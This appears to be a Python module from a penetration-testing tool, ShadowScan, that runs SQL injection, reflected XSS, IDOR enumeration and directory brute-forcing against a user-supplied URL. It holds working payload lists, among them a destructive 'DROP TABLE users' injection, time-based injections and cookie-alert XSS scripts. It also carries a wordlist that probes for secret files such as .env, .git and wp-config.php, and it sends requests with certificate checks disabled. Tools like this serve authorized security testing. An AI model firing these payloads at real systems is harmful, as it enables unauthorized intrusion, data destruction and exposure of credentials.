"""
modules/webapp.py
-----------------
Web Application Security Testing Module for ShadowScan v1.0
Covers: SQL Injection, XSS, IDOR, Directory Bruteforcing

Author  : Anveeksh Rao
GitHub  : github.com/anveeksh
Warning : For authorized testing and educational use only.
"""

import requests
import urllib3
from urllib.parse import urlparse, urljoin
from requests.exceptions import ConnectionError, Timeout, RequestException
from utils.banner import print_module_header, success, error, info, warn
from utils.helpers import save_results, press_enter

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

REQUEST_TIMEOUT = 7
DEFAULT_HEADERS = {
    "User-Agent": "Mozilla/5.0 (ShadowScan/1.0; Security Research)",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
}

SQLI_PAYLOADS = [
    "'", '"', "''", '""', "`",
    "' OR '1'='1", "' OR '1'='1'--", "' OR 1=1--",
    "\" OR \"1\"=\"1", "\" OR 1=1--",
    "' OR 'x'='x", "') OR ('1'='1",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "'; DROP TABLE users--",
    "1; SELECT SLEEP(3)--",
    "' AND SLEEP(3)--",
    "' AND 1=BENCHMARK(5000000,MD5(1))--",
    "'; WAITFOR DELAY '0:0:3'--",
]

SQLI_ERRORS = [
    "sql syntax", "mysql_fetch", "ora-", "syntax error",
    "unclosed quotation", "unterminated string", "pg_query",
    "sqlite3", "microsoft ole db", "odbc drivers",
    "division by zero", "supplied argument is not",
    "invalid query", "sql server", "mysql error",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<script>alert(document.cookie)</script>",
    "<img src=x onerror=alert('XSS')>",
    "<img src=x onerror=alert(1)>",
    "'><script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<svg onload=alert(1)>",
    "<svg/onload=alert('XSS')>",
    "<body onload=alert(1)>",
    "javascript:alert(1)",
    "<iframe src=javascript:alert(1)>",
    "';alert('XSS')//",
    "</script><script>alert(1)</script>",
    "<input autofocus onfocus=alert(1)>",
    "<details open ontoggle=alert(1)>",
]

DIR_WORDLIST = [
    "admin", "administrator", "login", "dashboard", "panel",
    "backend", "manage", "management", "control", "console",
    "api", "api/v1", "api/v2", "graphql", "swagger", "swagger-ui",
    "uploads", "upload", "files", "file", "static", "assets",
    "backup", "backups", "bak", "old", "archive",
    "config", "configuration", "settings", "setup",
    "test", "testing", "dev", "development", "staging",
    "debug", "trace", "logs", "log",
    ".env", ".git", ".htaccess", ".htpasswd",
    "wp-admin", "wp-login.php", "wp-config.php",
    "phpmyadmin", "pma", "adminer",
    "robots.txt", "sitemap.xml", "security.txt",
    "server-status", "server-info",
    "actuator", "actuator/health", "actuator/env",
    "console", "h2-console", "jolokia",
    "secret", "secrets", "private", "internal",
    "xmlrpc.php", "readme.html", "license.txt",
]


def validate_url(url):
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    parsed = urlparse(url)
    if not parsed.netloc:
        return None
    return url


def safe_get(url, headers=None, timeout=REQUEST_TIMEOUT):
    h = {**DEFAULT_HEADERS, **(headers or {})}
    try:
        return requests.get(url, headers=h, timeout=timeout, verify=False, allow_redirects=True)
    except ConnectionError:
        error(f"Connection refused: {url}")
    except Timeout:
        error(f"Request timed out: {url}")
    except RequestException as e:
        error(f"Request error: {e}")
    return None


def run():
    print_module_header("Web Application Testing")
    print("  [1]  SQL Injection Tester")
    print("  [2]  XSS Scanner")
    print("  [3]  IDOR Tester")
    print("  [4]  Directory Bruteforcer")
    print("  [0]  Back to Main Menu")
    print()
    choice = input("  Select option: ").strip()
    handlers = {"1": sqli_test, "2": xss_scan, "3": idor_test, "4": dir_brute}
    if choice in handlers:
        handlers[choice]()
    elif choice != "0":
        warn("Invalid option.")
    press_enter()


def sqli_test():
    print_module_header("SQL Injection Tester")
    raw = input("  Enter URL with parameter (e.g. http://site.com/item?id=1): ").strip()
    url = validate_url(raw)
    if not url:
        error("Invalid URL.")
        return
    info(f"Target   : {url}")
    info(f"Payloads : {len(SQLI_PAYLOADS)}\n")
    findings = []
    base_resp = safe_get(url)
    base_size = len(base_resp.content) if base_resp else 0
    for payload in SQLI_PAYLOADS:
        test_url = url + requests.utils.quote(payload)
        resp = safe_get(test_url)
        if not resp:
            continue
        body = resp.content.decode(errors="ignore").lower()
        triggered = any(e in body for e in SQLI_ERRORS)
        size_diff = abs(len(resp.content) - base_size)
        if triggered:
            success(f"[ERROR-BASED] {payload}")
            findings.append({"type": "error-based", "url": test_url, "payload": payload})
        elif size_diff > 500:
            warn(f"[POSSIBLE   ] {payload} | size diff: {size_diff}b")
            findings.append({"type": "possible", "url": test_url, "payload": payload})
        else:
            info(f"[CLEAN      ] {payload}")
    print()
    info(f"Payloads tested: {len(SQLI_PAYLOADS)} | Findings: {len(findings)}")
    if findings:
        path = save_results("sqli", {"target": url, "findings": findings})
        success(f"Results saved → {path}")
    else:
        warn("No SQLi indicators detected.")


def xss_scan():
    print_module_header("XSS Scanner")
    raw = input("  Enter URL with parameter (e.g. http://site.com/search?q=test): ").strip()
    url = validate_url(raw)
    if not url:
        error("Invalid URL.")
        return
    info(f"Target   : {url}")
    info(f"Payloads : {len(XSS_PAYLOADS)}\n")
    findings = []
    for payload in XSS_PAYLOADS:
        test_url = url + requests.utils.quote(payload, safe="")
        resp = safe_get(test_url)
        if not resp:
            continue
        body = resp.content.decode(errors="ignore")
        if payload.lower() in body.lower():
            success(f"[REFLECTED] {payload}")
            findings.append({"type": "reflected", "url": test_url, "payload": payload})
        elif "<script" in body.lower() or "onerror" in body.lower():
            warn(f"[PARTIAL  ] {payload}")
            findings.append({"type": "partial", "url": test_url, "payload": payload})
        else:
            info(f"[CLEAN    ] {payload}")
    print()
    info(f"Found: {len(findings)}")
    if findings:
        path = save_results("xss", {"target": url, "findings": findings})
        success(f"Results saved → {path}")
    else:
        warn("No reflected XSS detected.")


def idor_test():
    print_module_header("IDOR Tester")
    raw = input("  Enter URL with ID (e.g. http://site.com/api/users/1): ").strip()
    url = validate_url(raw)
    if not url:
        error("Invalid URL.")
        return
    token = input("  Auth token (Bearer) or press ENTER to skip: ").strip()
    try:
        start = int(input("  Start ID : ").strip())
        end   = int(input("  End ID   : ").strip())
    except ValueError:
        error("IDs must be integers.")
        return
    headers = {"Authorization": f"Bearer {token}"} if token else {}
    base    = url.rsplit("/", 1)[0]
    info(f"Target : {base}/<id>")
    info(f"Range  : {start} to {end}\n")
    findings = []
    for i in range(start, end + 1):
        test_url = f"{base}/{i}"
        resp = safe_get(test_url, headers=headers)
        if not resp:
            continue
        is_idor = resp.status_code == 200 and i != start
        size    = len(resp.content)
        if is_idor:
            success(f"[IDOR] ID {i:<5} → {resp.status_code} ({size} bytes)")
            findings.append({"id": i, "url": test_url, "status": resp.status_code, "size": size})
        elif resp.status_code == 200:
            info(f"[OWNED] ID {i:<5} → {resp.status_code} ({size} bytes)")
        else:
            info(f"[----] ID {i:<5} → {resp.status_code}")
    print()
    info(f"IDOR findings: {len(findings)}")
    if findings:
        path = save_results("idor", {"target": url, "findings": findings})
        success(f"Results saved → {path}")
    else:
        warn("No IDOR vulnerabilities found.")


def dir_brute():
    print_module_header("Directory Bruteforcer")
    raw = input("  Enter base URL (e.g. http://site.com): ").strip()
    url = validate_url(raw)
    if not url:
        error("Invalid URL.")
        return
    custom = input("  Custom wordlist path (or ENTER for built-in): ").strip()
    if custom:
        try:
            with open(custom, "r", errors="ignore") as f:
                wordlist = [w.strip() for w in f if w.strip()]
            info(f"Loaded {len(wordlist)} paths from {custom}")
        except FileNotFoundError:
            error(f"File not found: {custom}")
            return
    else:
        wordlist = DIR_WORDLIST
        info(f"Using built-in wordlist ({len(wordlist)} paths)")
    info(f"Target : {url}\n")
    findings = []
    STATUS_ICONS = {200: "✅", 301: "↪️ ", 302: "↪️ ", 403: "🔒", 500: "💥"}
    for word in wordlist:
        test_url = urljoin(url.rstrip("/") + "/", word)
        resp = safe_get(test_url)
        if not resp:
            continue
        code = resp.status_code
        icon = STATUS_ICONS.get(code, "  ")
        size = len(resp.content)
        if code in (200, 301, 302, 403, 500):
            success(f"{icon} [{code}] {test_url} ({size} bytes)")
            findings.append({"url": test_url, "status": code, "size": size})
        else:
            info(f"   [{code}] {test_url}")
    print()
    info(f"Interesting paths found: {len(findings)}")
    if findings:
        path = save_results("dirbust", {"target": url, "findings": findings})
        success(f"Results saved → {path}")
    else:
        warn("No interesting paths found.")
